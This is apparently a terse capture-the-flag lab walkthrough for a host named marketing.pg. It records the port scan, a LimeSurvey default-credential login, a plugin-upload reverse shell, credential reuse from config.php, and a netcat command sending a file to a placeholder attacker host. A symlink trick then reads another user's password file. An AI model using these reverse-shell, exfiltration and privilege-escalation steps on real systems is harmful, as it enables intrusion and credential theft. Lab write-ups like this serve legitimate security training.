22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: marketing.pg - Digital Marketing for you!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


port 80
<img width="1664" height="782" alt="image" src="https://github.com/user-attachments/assets/4401cfa6-b13c-47ec-9b92-6a9df352089f" />

/old. has a survey link
<img width="1394" height="697" alt="image" src="https://github.com/user-attachments/assets/df4b8671-3cd3-4729-88e5-1035ca6e0170" />
lime survey
<img width="1227" height="490" alt="image" src="https://github.com/user-attachments/assets/25fd04a8-e2a3-4077-afe6-64278c6c8162" />
default credentials for login is admin:password at /admin
<img width="1604" height="729" alt="image" src="https://github.com/user-attachments/assets/7f4f669e-d47d-429d-a711-0306e2aea04b" />
https://github.com/Y1LD1R1M-1337/Limesurvey-RCE 
Create your files (config.xml and php reverse shell files)
Create archive with these files
Login with credentials
Go Configuration -> Plugins -> Upload & Install
Choose your zipped file
Upload
Install
Activate plugin
Start your listener
Go http://customers-survey.marketing.pg/upload/plugins/Y1LD1R1M/php-rev.php
Get reverse shell
<img width="1491" height="336" alt="image" src="https://github.com/user-attachments/assets/9e43a688-221c-4460-880b-d0542dd4fbb5" />
ps aux shows mysql is up
<img width="853" height="67" alt="image" src="https://github.com/user-attachments/assets/01b491da-f116-47a7-897a-d44d55ec80be" />
in /var/www/LimeSurvey/application/config/config.php
'username' => 'limesurvey_user',
'password' => 'EzPwz2022_dev1$$23!!',

EzPwz2022_dev1$$23!! can be used to access t.miller
<img width="1033" height="100" alt="image" src="https://github.com/user-attachments/assets/b77d5510-f8af-48ec-81c9-84c76f336631" />
sudo -l, m.sander can run sync.sh
<img width="1033" height="140" alt="image" src="https://github.com/user-attachments/assets/6c307ae4-dd12-40bd-bdb5-bd12eda97ff7" />

id has mlocate group
/var/lib/mlocate/mlocate.db
i send that file to my attacker
nc -l -p 1234 -q 1 > something.zip < /dev/null
cat something.zip | netcat server.ip.here 1234
creds-for-2022.txt is sus
<img width="686" height="275" alt="image" src="https://github.com/user-attachments/assets/5eec2629-d1d5-4504-b5bc-f05a3a501470" />
so its actly in /home/m.sander/personal/creds-for-2022.txt
<img width="215" height="51" alt="image" src="https://github.com/user-attachments/assets/dc567ba7-de92-4de5-b48b-ea8dbdc34f5c" />
forbidden
<img width="906" height="70" alt="image" src="https://github.com/user-attachments/assets/90851c33-c864-4d06-ac62-3585d9f428cd" />
create symlink. to view that file
<img width="892" height="398" alt="image" src="https://github.com/user-attachments/assets/cd660f6c-a417-4785-9778-e467e3f369f9" />
m.sander:EzPwz2022_12345678#! WORKED
<img width="1034" height="75" alt="image" src="https://github.com/user-attachments/assets/5bd3a228-1d99-4a91-a086-21b3cd82f7ef" />


